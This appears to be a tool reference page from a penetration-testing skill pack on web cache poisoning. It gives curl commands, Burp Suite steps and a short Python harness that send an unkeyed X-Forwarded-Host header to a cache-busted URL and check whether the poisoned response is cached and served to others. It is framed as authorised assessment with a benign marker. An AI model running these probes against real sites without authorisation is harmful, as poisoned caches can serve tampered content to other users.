# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`web-cache-poisoning-and-deception`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS -D - -o /dev/null 'https://target.example/home?cb=wcp-aaaa' -H 'X-Forwarded-Host: wcp-marker.example'` | Send the unkeyed header with a cache-buster and read the cache-status headers in the response | Cross-platform |
| `curl` | `curl -sS 'https://target.example/home?cb=wcp-aaaa'` | Issue the clean follow-up request to the same busted key to see whether the poisoned response was stored | Cross-platform |
| `Param Miner (Burp)` | `Run 'Guess headers' against the target to enumerate unkeyed inputs the origin reflects` | Discover request headers that change the response but are excluded from the cache key | Cross-platform |
| `Burp Suite Repeater` | `Send paired requests with and without the suspect input, observing X-Cache hit/miss and Age` | Confirm store-then-serve behaviour on a single busted key | Cross-platform |

## Minimal Script Shape

A store-then-clean harness: it injects a benign marker through a suspected unkeyed header on a busted URL, then requests the same URL cleanly to see whether the marker was cached and shared.

```python
import urllib.request

BASE = 'https://target.example/home?cb=wcp-aaaa'
MARKER = 'wcp-marker.example'

def fetch(extra_headers):
    r = urllib.request.Request(BASE, headers=extra_headers)
    with urllib.request.urlopen(r, timeout=10) as resp:
        body = resp.read().decode('utf-8', 'replace')
        return resp.headers.get('X-Cache', ''), (MARKER in body)

store = fetch({'X-Forwarded-Host': MARKER, 'User-Agent': 'authorised-assessment'})
clean = fetch({'User-Agent': 'authorised-assessment'})
print({'store_request': store, 'clean_request': clean,
       'poisoned_and_shared': clean[1]})
```
